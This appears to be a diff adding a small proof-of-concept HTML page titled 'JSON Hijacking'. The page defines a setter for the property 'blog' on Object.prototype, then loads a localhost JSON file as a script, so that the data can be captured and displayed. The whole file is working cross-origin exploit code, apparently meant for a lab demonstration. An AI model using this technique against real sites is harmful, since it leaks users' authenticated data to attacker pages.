@@ -1,0 +1,53 @@
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.6.1/jquery.min.js" type="text/javascript" charset="utf-8"></script>
+<h1>JSON Hijacking</h1>
+<div id="viewer">
+  
+</div>
+
+<script type="text/javascript" charset="utf-8">
+  function objectToString(o) {
+
+  	var parse = function(_o) {
+
+  		var a = [],
+  			t;
+
+  		for (var p in _o) {
+
+  			if (_o.hasOwnProperty(p)) {
+
+  				t = _o[p];
+
+  				if (t && typeof t == "object") {
+
+  					a[a.length] = p + ":{ " + arguments.callee(t).join(", ") + "}";
+
+  				} else {
+
+  					if (typeof t == "string") {
+
+  						a[a.length] = [p + ": \"" + t.toString() + "\""];
+  					} else {
+  						a[a.length] = [p + ": " + t.toString()];
+  					}
+
+  				}
+  			}
+  		}
+
+  		return a;
+
+  	}
+
+  	return "{" + parse(o).join(", ") + "}";
+
+  }
+  var viewer = $('#viewer');
+  Object.prototype.__defineSetter__("blog", function(x) {
+    for (var i = arguments.length - 1; i >= 0; i--){
+      viewer.append(objectToString(arguments[i])).append("<br>");
+    };
+  });
+</script>
+
+<script src="http://localhost/blogs.json"></script>
